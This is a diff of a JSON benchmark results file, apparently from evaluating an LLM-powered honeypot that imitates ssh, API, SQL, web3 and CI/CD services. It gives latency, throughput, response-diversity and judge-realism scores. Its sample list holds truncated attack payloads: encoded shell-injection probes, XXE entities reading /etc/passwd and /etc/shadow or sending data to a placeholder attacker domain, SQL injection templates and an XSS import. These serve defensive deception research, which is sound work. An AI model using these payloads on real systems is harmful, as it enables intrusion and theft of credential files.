@@ -4,265 +4,265 @@
     "judge_model": "meta-llama/llama-3.1-70b-instruct",
     "static_trials": 30,
     "dynamic_latency_trials": 20,
-    "diversity_dataset_size": 1328,
+    "diversity_dataset_size": 2500,
     "judge_sample_size": 30
   },
   "latency": {
     "static": {
-      "mean_s": 0.0003,
-      "median_s": 0.0003,
-      "stdev_s": 0.0,
-      "min_s": 0.0002,
-      "max_s": 0.0004,
+      "mean_s": 0.0008,
+      "median_s": 0.0008,
+      "stdev_s": 0.0003,
+      "min_s": 0.0004,
+      "max_s": 0.0021,
       "n": 30
     },
     "dynamic": {
-      "mean_s": 1.9525,
-      "median_s": 1.6943,
-      "stdev_s": 0.6795,
-      "min_s": 0.9938,
-      "max_s": 3.7015,
+      "mean_s": 2.3325,
+      "median_s": 1.7277,
+      "stdev_s": 1.4019,
+      "min_s": 1.1505,
+      "max_s": 5.9194,
       "n": 20
     }
   },
   "throughput_rps": {
-    "static": 3333.33,
-    "dynamic_sequential": 0.5122
+    "static": 1250.0,
+    "dynamic_sequential": 0.4287
   },
   "concurrent_throughput": {
     "concurrency_level": 10,
-    "wall_time_s": 3.2787,
-    "throughput_rps": 3.05,
+    "wall_time_s": 6.2057,
+    "throughput_rps": 1.6114,
     "per_request_latency": {
-      "mean_s": 2.6206,
-      "median_s": 2.5745,
-      "stdev_s": 0.5087,
-      "min_s": 1.8435,
-      "max_s": 3.2776,
+      "mean_s": 2.1935,
+      "median_s": 1.6198,
+      "stdev_s": 1.5292,
+      "min_s": 1.1209,
+      "max_s": 6.2039,
       "n": 10
     }
   },
   "response_diversity_by_service": {
-    "api": {
-      "n": 300,
-      "distinct": 138,
-      "uniqueness_ratio": 0.46
-    },
     "ssh": {
-      "n": 500,
-      "distinct": 482,
-      "uniqueness_ratio": 0.964
+      "n": 1862,
+      "distinct": 1681,
+      "uniqueness_ratio": 0.903
+    },
+    "api": {
+      "n": 136,
+      "distinct": 87,
+      "uniqueness_ratio": 0.64
     },
     "sql": {
-      "n": 500,
-      "distinct": 489,
-      "uniqueness_ratio": 0.978
+      "n": 474,
+      "distinct": 470,
+      "uniqueness_ratio": 0.992
     },
     "web3": {
       "n": 18,
-      "distinct": 15,
-      "uniqueness_ratio": 0.833
+      "distinct": 17,
+      "uniqueness_ratio": 0.944
     },
     "cicd": {
       "n": 10,
-      "distinct": 10,
-      "uniqueness_ratio": 1.0
+      "distinct": 9,
+      "uniqueness_ratio": 0.9
     }
   },
-  "avg_response_words_dynamic": 13.1,
+  "avg_response_words_dynamic": 13.8,
   "llm_judge_realism": {
-    "mean_score_1to5": 3.37,
-    "stdev": 1.92,
+    "mean_score_1to5": 4.37,
+    "stdev": 1.45,
     "n_scored": 30,
     "n_requested": 30,
     "distribution": {
-      "1": 10,
-      "2": 3,
+      "1": 4,
+      "2": 1,
       "3": 0,
       "4": 0,
-      "5": 17
+      "5": 25
     }
   },
   "judge_sample_details": [
     {
+      "service": "ssh",
+      "payload": "&&echo%20QTDSQL$((20%2B35))$(echo%20QTDSQL)QTDSQL\" #a4f3e64b",
+      "score": 5,
+      "reason": "The response accurately reflects a real bash shell's syntax error handling."
+    },
+    {
+      "service": "ssh",
+      "payload": "%27echo%20HMZWLY$((77%2B96))$(echo%20HMZWLY)HMZWLY%5C%5C #7c228a3d",
+      "score": 5,
+      "reason": "The response appears to be a genuine error message from a Perl interpreter, which is a plausible outcome for a malformed SSH payload."
+    },
+    {
       "service": "api",
-      "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!E",
+      "payload": "<!ENTITY % file SYSTEM \"file:///sys/power/image_size\"> #37170f2f",
+      "score": 1,
+      "reason": "The response is too generic and does not acknowledge the XML entity injection attempt."
+    },
+    {
+      "service": "ssh",
+      "payload": "%3B%20str%3D%24%28echo%20YUQKED%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202",
+      "score": 5,
+      "reason": "The response is a typical error message from a real bash shell."
+    },
+    {
+      "service": "api",
+      "payload": "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss",
       "score": 1,
       "reason": "Response is too generic and doesn't resemble a typical API error response."
     },
     {
-      "service": "ssh",
-      "payload": "%26%20sleep%200%20%26%26%20str%3D%24%28echo%20IYDPRO%29%20%26%26%20str1%3D%24%7B",
+      "service": "sql",
+      "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS N",
       "score": 5,
-      "reason": "The response is a realistic bash error message for an invalid command."
+      "reason": "The response is a valid SQL result set with expected column names and data types."
     },
     {
-      "service": "api",
-      "payload": "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]> #",
+      "service": "ssh",
+      "payload": "%27%3B%20str%3D%24%28echo%20GHEHAJ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%",
+      "score": 5,
+      "reason": "The response is a typical bash syntax error message, indistinguishable from a real system's output."
+    },
+    {
+      "service": "ssh",
+      "payload": "%2522%7C%20%5B%206%20-ne%20%24%28echo%20NREISI%20%7C%20tr%20-d%20%27%5Cn%27%20%7",
+      "score": 5,
+      "reason": "The response is a typical error message from a real bash shell when it encounters an invalid command."
+    },
+    {
+      "service": "ssh",
+      "payload": "&echo%20KHEGEQ$((46%2B22))$(echo%20KHEGEQ)KHEGEQ// #c4c000b2",
       "score": 1,
-      "reason": "Response is a generic, templated error message with no relation to the XML payload."
-    },
-    {
-      "service": "sql",
-      "payload": "to_timestamp_tz /*7dd8937a*/",
-      "score": 5,
-      "reason": "The response is a valid SQL query that a real PostgreSQL server would produce when encountering an unknown function like to_timestamp_tz."
-    },
-    {
-      "service": "sql",
-      "payload": "OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDN",
-      "score": 5,
-      "reason": "The error message accurately reflects the syntax error and includes the correct error code and line number."
-    },
-    {
-      "service": "api",
-      "payload": "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" > #46831397",
-      "score": 1,
-      "reason": "Generic error message with no relation to the XXE payload"
-    },
-    {
-      "service": "sql",
-      "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RI",
-      "score": 5,
-      "reason": "The response is a genuine PostgreSQL error message with correct syntax and formatting."
+      "reason": "obviously templated response with repeated text"
     },
     {
       "service": "ssh",
-      "payload": "%3B%20str%3D%24%28echo%20ZSSQMT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202",
+      "payload": "%3B%20str%3D%24%28echo%20OKKNHF%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206",
       "score": 5,
-      "reason": "The response accurately reflects a real bash shell's error message when encountering an invalid command."
+      "reason": "The response is a realistic error message from a bash shell, including the exact syntax error and the correct variable expansion."
     },
     {
       "service": "sql",
-      "payload": ";CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL",
+      "payload": "' or user like '% /*52580a58*/",
       "score": 5,
-      "reason": "The error message is specific and matches the syntax error in the query, consistent with a real PostgreSQL server's response."
-    },
-    {
-      "service": "sql",
-      "payload": "CREATE TABLE pwn.shell (code TEXT); /*81bf1914*/",
-      "score": 5,
-      "reason": "The response is a standard PostgreSQL create table confirmation message."
-    },
-    {
-      "service": "api",
-      "payload": "<!ENTITY % d SYSTEM \"file:///etc/passwd\"> #961ecdaa",
-      "score": 1,
-      "reason": "Response is too generic and explicitly states the request is malicious."
+      "reason": "The error message is specific and matches the expected response from a real PostgreSQL server."
     },
     {
       "service": "ssh",
-      "payload": "%7C%20%5B%203%20-ne%20%24%28echo%20GJJXKM%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20w",
+      "payload": "%2527%0A%20str%3D%24%28echo%20KARBCX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5",
       "score": 5,
-      "reason": "The response accurately reflects the output of a real bash shell executing the payload, including the job control messages."
+      "reason": "The response accurately reflects the execution of the provided shell commands, including the sleep commands and their timing."
     },
     {
       "service": "ssh",
-      "payload": "%22%26%26echo%20BCDGJZ$((39%2B25))$(echo%20BCDGJZ)BCDGJZ #b7adc627",
+      "payload": "%3B%20str%3D%24%28echo%20QIIKMD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201",
       "score": 5,
-      "reason": "The response accurately executes the payload's commands and returns the expected output, including the correct arithmetic calculation and file creation."
+      "reason": "The response is a typical error message from a real bash shell when it encounters a syntax error."
     },
     {
       "service": "ssh",
-      "payload": "%27%0A%20str%3D%24%28echo%20GIPRGX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%",
+      "payload": "%2527%3B%20str%3D%24%28echo%20NSSNST%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5",
       "score": 5,
-      "reason": "The response is a genuine bash error message with correct syntax and formatting."
-    },
-    {
-      "service": "sql",
-      "payload": "\") or true-- /*3c21be79*/",
-      "score": 5,
-      "reason": "The response is a valid SQL query that reflects the injected payload, indicating a realistic SQL server behavior."
-    },
-    {
-      "service": "sql",
-      "payload": "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) /*445dcc29*/",
-      "score": 5,
-      "reason": "The response is a standard PostgreSQL error message with correct syntax and formatting."
+      "reason": "The response is a perfect imitation of a real bash shell's output for an invalid command."
     },
     {
       "service": "ssh",
-      "payload": "%2522%7C%20%5B%209%20-ne%20%24%28echo%20JLFVEC%20%7C%20tr%20-d%20%27%5Cn%27%20%7",
+      "payload": "; ping -n 10 127.0.0.1 #03843b05",
       "score": 5,
-      "reason": "The response accurately reflects the expected output of a real SSH shell executing the provided payload."
-    },
-    {
-      "service": "api",
-      "payload": "<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/",
-      "score": 1,
-      "reason": "Contains an explicit disclaimer about not generating harmful responses."
+      "reason": "The response is a realistic output of a Linux ping command."
     },
     {
       "service": "ssh",
-      "payload": "%7C%20%5B%208%20-ne%20%24%28echo%20PENGWJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20w",
+      "payload": "&echo$IFSMIRTWY$((62%2B53))$(echo$IFSMIRTWY)MIRTWY #74faebb4",
       "score": 5,
-      "reason": "The response is a typical bash error message for an unknown command."
+      "reason": "The response accurately reflects how a real bash shell would handle the malformed input."
     },
     {
       "service": "ssh",
-      "payload": "%2522%3B%20str%3D%24%28echo%20PRACFZ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5",
+      "payload": "%3Becho$IFSWAGECK$((2%2B54))$(echo$IFSWAGECK)WAGECK #78312b88",
       "score": 5,
-      "reason": "The response accurately reflects the expected behavior of a real bash shell encountering a malformed input with null bytes."
+      "reason": "The response is a realistic bash job control message, indicating the command was stopped."
     },
     {
-      "service": "web3",
-      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"debug_traceTransaction\", \"params\": [\"0xTransaction",
+      "service": "ssh",
+      "payload": "$( ping -c 20 127.0.0.1 ) #1f3db122",
       "score": 5,
-      "reason": "The response is a valid JSON-RPC response with a plausible result value for a debug_traceTransaction call."
+      "reason": "The response is a realistic and complete output of a successful ping command."
     },
     {
-      "service": "api",
-      "payload": "<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> #b7",
-      "score": 1,
-      "reason": "The response is a generic, templated error message that does not resemble a typical API error response."
+      "service": "ssh",
+      "payload": "||echo$IFSFWBTCO$((35%2B92))$(echo$IFSFWBTCO)FWBTCO| #2b2aa430",
+      "score": 5,
+      "reason": "The response is a typical error message from a real bash shell."
     },
     {
-      "service": "api",
-      "payload": "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]> #",
+      "service": "ssh",
+      "payload": "\".print(`echo%20UCUISA;echo%20$((65%2B31));echo%20UCUISA;echo%20UCUISA`)%3BUCUIS",
       "score": 2,
-      "reason": "Generic error message without any specific details or context."
+      "reason": "The response is a generic 'command not found' error, but a real bash shell would not have included the entire payload in the error message."
     },
     {
       "service": "ssh",
-      "payload": "%2527%3B%20str%3D%24%28echo%20BVJEPJ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5",
+      "payload": "&&echo%20QZXLOK$((2%2B27))$(echo%20QZXLOK)QZXLOK%27 #c6eafa2c",
       "score": 5,
-      "reason": "The response accurately reflects the expected syntax errors and command not found messages from a real bash shell."
-    },
-    {
-      "service": "api",
-      "payload": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x\"> #81a5ee75",
-      "score": 1,
-      "reason": "Response contains an obvious AI disclaimer."
-    },
-    {
-      "service": "api",
-      "payload": "<!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]> #5d6eae20",
-      "score": 2,
-      "reason": "Generic error message without any specific details or XML parsing error indication."
-    },
-    {
-      "service": "api",
-      "payload": "<!ENTITY % xxe PUBLIC \"Random Text\" \"URL\"> #bfd03686",
-      "score": 1,
-      "reason": "The response is too generic and does not acknowledge the XML External Entity (XXE) injection attempt."
-    },
-    {
-      "service": "api",
-      "payload": "<!DOCTYPE xxe [ <!ENTITY % file SYSTEM \"file:///c:/boot.ini\"><!ENTITY % dtd SYST",
-      "score": 1,
-      "reason": "The response is a generic error message that does not acknowledge the XML payload or the XXE attack."
-    },
-    {
-      "service": "web3",
-      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"miner_start\", \"params\": [4], \"id\": 1} #3f1e3a8e",
-      "score": 2,
-      "reason": "The response is too generic and lacks specific details that a real Ethereum node would provide, such as the actual mining status or an error message."
+      "reason": "The response is a realistic bash error message for the given payload."
     },
     {
       "service": "ssh",
-      "payload": "%0aecho%20COCDTZ$((30%2B94))$(echo%20COCDTZ)COCDTZ%2F%2F #06db68c1",
+      "payload": "%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZSTLVQ%29%20%26%26%20str1%3D%24",
+      "score": 5,
+      "reason": "The response is a realistic bash error message with proper syntax and escaping."
+    },
+    {
+      "service": "ssh",
+      "payload": "%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20XGXYKB%29%20%26%26%20str1%3D%",
+      "score": 5,
+      "reason": "The response is a realistic bash error message with correct syntax and formatting."
+    },
+    {
+      "service": "api",
+      "payload": "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'> #73",
       "score": 1,
-      "reason": "Response is a direct echo of the payload with no actual command execution or error handling."
+      "reason": "The response is too generic and does not reflect the typical error handling of a real API when encountering an XML External Entity (XXE) attack payload."
+    },
+    {
+      "service": "ssh",
+      "payload": "||echo$IFSZFIGIN$((20%2B19))$(echo$IFSZFIGIN)ZFIGIN%26 #f21252b4",
+      "score": 5,
+      "reason": "The response is a realistic syntax error message from a bash shell."
+    },
+    {
+      "service": "sql",
+      "payload": "admin\") or \"1\"=\"1\"/* /*255ab95e*/",
+      "score": 5,
+      "reason": "The response is a realistic PostgreSQL error message with correct syntax and formatting."
+    },
+    {
+      "service": "ssh",
+      "payload": ";echo%20OSGFBJ$((4%2B40))$(echo%20OSGFBJ)OSGFBJ%5C%5C #4d5d112b",
+      "score": 5,
+      "reason": "The response is a genuine bash error message for an invalid command."
+    },
+    {
+      "service": "ssh",
+      "payload": "%26%20sleep%200%20%26%26%20str%3D%24%28echo%20EHNNQT%29%20%26%26%20str1%3D%24%7B",
+      "score": 5,
+      "reason": "The response is a genuine bash error message with correct syntax highlighting and error description."
+    },
+    {
+      "service": "ssh",
+      "payload": "%7C%20%5B%204%20-ne%20%24%28echo%20KBHDAS%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20w",
+      "score": 5,
+      "reason": "The response accurately reflects the expected syntax error and interpreter error messages from a real bash shell."
+    },
+    {
+      "service": "ssh",
+      "payload": "%22%3B%20str%3D%24%28echo%20VPBZFR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%",
+      "score": 5,
+      "reason": "The response accurately reflects the execution of the injected shell commands."
     }
   ]
 }
